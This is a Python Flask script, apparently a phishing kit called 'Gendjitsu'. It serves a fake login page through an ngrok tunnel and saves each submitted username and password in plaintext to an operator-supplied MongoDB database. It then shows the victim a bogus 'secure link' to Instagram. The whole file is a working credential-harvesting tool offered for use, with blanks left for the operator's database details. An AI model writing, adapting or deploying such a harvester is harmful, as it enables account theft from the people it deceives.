import os
import time
import pyfiglet
import subprocess
from colorama import Fore
from colorama import init
from pymongo import MongoClient 
from flask_ngrok import run_with_ngrok
from flask import Flask, redirect, url_for, render_template, request

init()

g = Fore.GREEN
w = Fore.WHITE
r = Fore.RED
b = Fore.BLUE

def opening():
    os.system("cls")
    art()
    time.sleep(3)
    subprocess.run(["python","ascii_art_color.py"])
    os.system("cls")
    start()
    os.system("cls")
    print(r + "Server is down")

def art():
    print(pyfiglet.figlet_format("Gendjitsu"))
    print(b + "For more visit: https://github.com/FRNINEZY")
    print(g + "Staring Server" + w)

app = Flask(__name__)
run_with_ngrok(app)

@app.route("/", methods=["POST", "GET"])
def login():
    if request.method == "POST":
        username = request.form["user"]
        password =request.form["passwd"]
        cluster = MongoClient() #your mongodb app connnect link(important)
        data = cluster[] #your database name 
        classs = data[] #your collection name 
        post = {"login": username, "password": password}
        classs.insert_one(post)
        return "<h1>Here is your secure link</h1><a href='https://www.instagram.com/'>secure link</a>"
    return render_template("login.html")

def start():
    if __name__ == "__main__":
        app.run()

opening()
